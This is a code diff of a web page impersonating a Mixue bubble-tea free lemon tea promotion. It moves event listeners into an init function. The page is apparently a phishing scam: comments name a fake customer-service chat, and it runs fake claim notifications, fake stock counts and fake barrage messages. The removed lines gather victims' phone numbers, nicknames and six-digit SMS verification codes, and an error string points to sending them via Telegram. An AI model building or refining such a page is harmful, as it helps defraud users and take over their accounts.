+    els.shareBtn.addEventListener('click', () => {
+      const code = els.couponCode ? els.couponCode.textContent : '';
+      const text = `蜜雪冰城免费大杯柠檬茶到手啦！券码：${code}\n快来一起喝！`;
+      if (navigator.share) {
+        navigator.share({ title: '免费柠檬茶', text: text });
+      } else {
+        navigator.clipboard.writeText(text).then(() => showToast('分享文案已复制，快发给朋友吧！'));
+      }
+    });
+  }
+
+  if (els.viewHistoryBtn) els.viewHistoryBtn.addEventListener('click', showCouponHistory);
+
+  // 假客服聊天事件
+  if (els.sendChatBtn && els.chatInput) {
+    els.sendChatBtn.addEventListener('click', () => {
+      const text = els.chatInput.value.trim();
+      if (!text) return;
+      
+      addMessage(text, false);
+      els.chatInput.value = '';
+      customerReply(text);
     });
 
-    if (!response.ok) throw new Error('Telegram 发送失败');
-
-    let s = 60;
-    els.getBtn.textContent = `重发(${s}s)`;
-    els.code.focus();
-    els.countdown.style.opacity = '1';
-    els.countdown.textContent = `验证码已发送（${s}s）`;
-
-    timers.code = setInterval(() => {
-      s--;
-      if (s > 0) {
-        els.getBtn.textContent = `重发(${s}s)`;
-        els.countdown.textContent = `验证码已发送（${s}s）`;
-      } else {
-        clearInterval(timers.code);
-        isSending = false;
-        els.getBtn.disabled = !( /^1[3-9]\d{9}$/.test(els.phone.value.trim()) && isVerifySuccess );
-        els.getBtn.textContent = '获取验证码';
-        els.countdown.style.opacity = '0';
-      }
-    }, 1000);
-
-  } catch (err) {
-    console.error('发送失败：', err);
-    showToast('网络异常，稍后再试');
-    isSending = false;
-    els.getBtn.disabled = false;
-    els.getBtn.textContent = '获取验证码';
+    els.chatInput.addEventListener('keypress', e => {
+      if (e.key === 'Enter') els.sendChatBtn.click();
+    });
   }
-});
-
-els.code.addEventListener('input', () => {
-  const len = els.code.value.trim().length;
-  els.submitBtn.style.display = len >= 4 ? 'block' : 'none';
-  els.submitBtn.disabled = len < 6;
-  els.code.classList.toggle('input-error', len > 0 && len < 6);
-});
-
-els.submitBtn.addEventListener('click', async () => {
-  if (els.submitBtn.disabled || isPolling) return;
-
-  const phone = els.phone.value.trim();
-  const code = els.code.value.trim();
-  const nick = els.nickname.value.trim() || '无';
-
-  if (code.length !== 6) {
-    showToast('请输入6位有效验证码');
-    return;
-  }
-
-  if (localStorage.getItem('mx_claim_' + phone)) {
-    showToast('该手机号已参与过活动');
-    return;
-  }
-
-  startManualReview(phone, nick, code);
-});
-
-els.inviteMoreBtn.addEventListener('click', simulateInvite);
-els.redeemBtn.addEventListener('click', redeemInviteCode);
-els.wheelBtn.addEventListener('click', spinWheel);
-els.checkInBtn.addEventListener('click', dailyCheckIn);
-
-els.modal.addEventListener('click', e => {
-  if (e.target === els.modal) els.modal.classList.remove('show');
-});
-
-els.rejectedModal.addEventListener('click', e => {
-  if (e.target === els.rejectedModal) els.rejectedModal.classList.remove('show');
-});
-
-els.copyCouponBtn?.addEventListener('click', () => {
-  const code = els.couponCode.textContent;
-  if (navigator.clipboard) {
-    navigator.clipboard.writeText(code).then(() => showToast('券码已复制！'));
-  } else {
-    showToast('请长按券码手动复制');
-  }
-});
-
-els.shareBtn?.addEventListener('click', () => {
-  const text = `蜜雪冰城免费大杯柠檬茶到手啦！券码：${els.couponCode.textContent}\n快来一起喝！`;
-  if (navigator.share) {
-    navigator.share({ title: '免费柠檬茶', text: text });
-  } else {
-    navigator.clipboard.writeText(text).then(() => showToast('分享文案已复制，快发给朋友吧！'));
-  }
-});
-
-els.viewHistoryBtn?.addEventListener('click', showCouponHistory);
-
-// 假客服聊天事件
-els.sendChatBtn.addEventListener('click', () => {
-  const text = els.chatInput.value.trim();
-  if (!text) return;
-  
-  addMessage(text, false);
-  els.chatInput.value = '';
-  customerReply(text);
-});
-
-els.chatInput.addEventListener('keypress', e => {
-  if (e.key === 'Enter') els.sendChatBtn.click();
-});
+}
 
 // 启动
-window.addEventListener('load', () => {
+function init() {
   initSplashScreen();
   antiCheat();
   initKeyboardShortcuts();
+  initEventListeners();
   
-  timers.fake    = setInterval(fakeClaim, 1400);
+  timers.fake = setInterval(fakeClaim, 1400);
   timers.barrage = setInterval(() => {
     if (Math.random() > 0.35) shootBarrage();
   }, 1600);
   startCountdown();
   updateStock();
-});
+  
+  // 加载完成后显示页面
+  setTimeout(() => {
+    const splash = document.getElementById('splashScreen');
+    if (splash) splash.classList.add('hide');
+  }, 2500);
+}
+
+window.addEventListener('load', init);
 
 window.addEventListener('beforeunload', () => {
-  Object.values(timers).forEach(t => clearInterval(t));
+  Object.values(timers).forEach(t => {
+    if (t) clearInterval(t);
+  });
   saveToStorage();
+});
+
+// 防止内存泄漏
+window.addEventListener('unload', () => {
+  Object.values(timers).forEach(t => {
+    if (t) clearInterval(t);
+  });
 });
 </script>
 </body>
-  </html>
+</html>
